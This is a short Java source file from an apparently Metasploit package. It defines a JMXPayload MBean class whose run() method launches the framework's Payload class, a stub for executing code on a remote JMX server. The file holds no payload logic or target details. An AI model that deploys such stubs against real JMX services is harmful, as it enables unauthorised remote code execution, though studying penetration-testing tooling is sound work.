package metasploit;

import java.io.*;

import javax.management.*;

public class JMXPayload implements JMXPayloadMBean {
    public Object run() throws Exception {
        Payload.main(null);
        return null;
    }
}
